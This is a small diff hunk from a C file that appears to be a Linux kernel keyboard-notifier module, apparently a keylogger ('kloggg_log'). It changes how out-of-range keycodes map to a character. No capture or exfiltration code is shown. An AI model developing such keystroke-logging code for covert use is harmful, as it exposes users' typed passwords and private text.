@@ -55,7 +55,7 @@ static char kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
   if (symbol < 128) /* ASCII range */
     return (char)symbol;
   else
-    return (char)128;
+    return '?';
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
